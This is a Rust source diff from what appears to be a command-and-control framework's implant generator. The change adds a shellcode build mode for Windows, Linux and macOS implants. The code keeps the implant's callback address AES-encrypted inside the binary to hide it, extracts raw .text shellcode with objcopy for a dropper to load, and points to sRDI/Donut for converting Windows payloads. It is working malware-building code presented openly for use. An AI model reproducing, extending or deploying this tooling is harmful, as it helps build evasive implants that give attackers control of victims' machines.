@@ -28,26 +28,46 @@ mod tests {
     }
 }
 
-pub fn generate_windows(callback: &str) {
+pub fn generate_windows(callback: &str, shellcode: bool) {
     build(
         callback,
         "links/windows",
         "x86_64-pc-windows-gnu",
-        "link-windows.exe",
+        if shellcode {
+            "link-windows.bin"
+        } else {
+            "link-windows.exe"
+        },
+        shellcode,
     );
 }
 
-pub fn generate_linux(callback: &str) {
+pub fn generate_linux(callback: &str, shellcode: bool) {
     build(
         callback,
         "links/linux",
         "x86_64-unknown-linux-musl",
-        "link-linux",
+        if shellcode {
+            "link-linux.bin"
+        } else {
+            "link-linux"
+        },
+        shellcode,
     );
 }
 
-pub fn generate_osx(callback: &str) {
-    build(callback, "links/osx", "x86_64-apple-darwin", "link-osx");
+pub fn generate_osx(callback: &str, shellcode: bool) {
+    build(
+        callback,
+        "links/osx",
+        "x86_64-apple-darwin",
+        if shellcode {
+            "link-osx.bin"
+        } else {
+            "link-osx"
+        },
+        shellcode,
+    );
 }
 
 // ── Internal ─────────────────────────────────────────────────────────────────
@@ -104,10 +124,10 @@ fn check_prerequisites(target: &str) -> bool {
 }
 
 /// Derive a 32-byte key using SHA-256 — must stay aligned with link-common::derive_key.
-fn derive_key_sha256(secret: &str, salt: &str) -> [u8; 32] {
+fn derive_key_sha256(secret: &[u8], salt: &str) -> [u8; 32] {
     use sha2::{Digest, Sha256};
     let mut hasher = Sha256::new();
-    hasher.update(secret.as_bytes());
+    hasher.update(secret);
     hasher.update(salt.as_bytes());
     let result = hasher.finalize();
     let mut key = [0u8; 32];
@@ -134,7 +154,7 @@ fn encrypt_aes_gcm(data: &str, key: &[u8; 32]) -> String {
     hex::encode(result)
 }
 
-fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str) {
+fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str, shellcode: bool) {
     let dir = Path::new(crate_dir);
     if !dir.exists() {
         tracing::error!(
@@ -148,35 +168,60 @@ fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str) {
         return;
     }
 
-    // Generate a random 32-byte secret for this implant
-    let secret = hex::encode(rand::random::<[u8; 32]>());
+    // shellcode mode requires objcopy for Linux
+    if shellcode && target.contains("linux") && !check_objcopy() {
+        return;
+    }
 
-    // Encrypt the callback so it is not stored in plaintext in the binary.
-    // The implant derives the same key and calls decrypt_config(CALLBACK, &key).
-    let key = derive_key_sha256(&secret, "callback-salt");
+    let secret = hex::encode(rand::random::<[u8; 32]>());
+    let key = derive_key_sha256(secret.as_bytes(), "callback-salt");
     let encrypted_callback = encrypt_aes_gcm(callback, &key);
 
+    // Choisir le profil de compilation
+    let profile = if shellcode {
+        "release-shellcode"
+    } else {
+        "release"
+    };
+    let profile_dir = if shellcode {
+        "release-shellcode"
+    } else {
+        "release"
+    };
+
     tracing::info!(
-        "Building {} implant ({}) for {} …",
+        "Building {} implant ({}) for {} {}…",
         output_name,
         target,
-        callback
+        callback,
+        if shellcode { "[SHELLCODE MODE]" } else { "" }
     );
 
     let result = Command::new("cargo")
-        .env("CALLBACK", encrypted_callback)
+        .env("CALLBACK", &encrypted_callback)
         .env("IMPLANT_SECRET", &secret)
-        .args(["build", "--release", "--target", target, "--quiet"])
+        .args(["build", "--profile", profile, "--target", target, "--quiet"])
         .current_dir(dir)
         .status();
 
+    // Le nom du binaire dans target/ est toujours le nom de la crate, pas output_name
+    let bin_name = match target {
+        t if t.contains("windows") => "link-windows.exe",
+        t if t.contains("linux") => "link-linux",
+        _ => "link-osx",
+    };
     let binary = Path::new("target")
         .join(target)
-        .join("release")
-        .join(output_name);
+        .join(profile_dir)
+        .join(bin_name);
 
     let dest = output_dir().join(output_name);
-    handle_result(result, &binary, &dest);
+
+    if shellcode {
+        handle_shellcode_result(result, &binary, &dest, target);
+    } else {
+        handle_result(result, &binary, &dest);
+    }
 }
 
 fn handle_result(status: io::Result<ExitStatus>, src: &Path, dest: &Path) {
@@ -189,6 +234,78 @@ fn handle_result(status: io::Result<ExitStatus>, src: &Path, dest: &Path) {
                 }
             } else {
                 tracing::error!("Build succeeded but binary not found at {}", src.display());
+            }
+        }
+        Ok(s) => tracing::error!("Build failed (exit {})", s),
+        Err(e) => tracing::error!("Failed to invoke cargo: {}", e),
+    }
+}
+
+/// Vérifier que objcopy (de binutils) est disponible pour l'extraction shellcode Linux
+fn check_objcopy() -> bool {
+    let found = Command::new("which")
+        .arg("objcopy")
+        .output()
+        .map(|out| out.status.success())
+        .unwrap_or(false);
+    if !found {
+        tracing::error!("objcopy not found. Required for --shellcode on Linux.");
+        tracing::error!("Debian/Ubuntu: sudo apt-get install binutils");
+        tracing::error!("Fedora/RHEL:   sudo dnf install binutils");
+    }
+    found
+}
+
+/// Post-traitement shellcode : extraction flat binary via objcopy
+fn handle_shellcode_result(status: io::Result<ExitStatus>, src: &Path, dest: &Path, target: &str) {
+    match status {
+        Ok(s) if s.success() => {
+            if !src.exists() {
+                tracing::error!("Build succeeded but binary not found at {}", src.display());
+                return;
+            }
+
+            if target.contains("linux") || target.contains("apple") {
+                // ELF/Mach-O → flat binary via objcopy
+                let objcopy_result = Command::new("objcopy")
+                    .args(["-O", "binary", "--only-section=.text"])
+                    .arg(src)
+                    .arg(dest)
+                    .status();
+                match objcopy_result {
+                    Ok(s) if s.success() => {
+                        if let Ok(meta) = fs::metadata(dest) {
+                            tracing::info!(
+                                "Shellcode written to {} ({} bytes)",
+                                dest.display(),
+                                meta.len()
+                            );
+                        }
+                    }
+                    _ => {
+                        // Fallback : copier le binaire brut (le dropper peut le charger tel quel)
+                        tracing::warn!("objcopy failed, falling back to raw binary copy");
+                        match fs::copy(src, dest) {
+                            Ok(_) => tracing::info!("Raw binary written to {}", dest.display()),
+                            Err(e) => tracing::error!("Copy failed: {}", e),
+                        }
+                    }
+                }
+            } else {
+                // Windows PE → copier le .exe (conversion sRDI future item B.9)
+                // Pour l'instant, le dropper charge le PE directement
+                match fs::copy(src, dest) {
+                    Ok(_) => {
+                        if let Ok(meta) = fs::metadata(dest) {
+                            tracing::info!(
+                                "PE shellcode written to {} ({} bytes). Use sRDI/Donut for PIC conversion.",
+                                dest.display(),
+                                meta.len()
+                            );
+                        }
+                    }
+                    Err(e) => tracing::error!("Copy failed: {}", e),
+                }
             }
         }
         Ok(s) => tracing::error!("Build failed (exit {})", s),
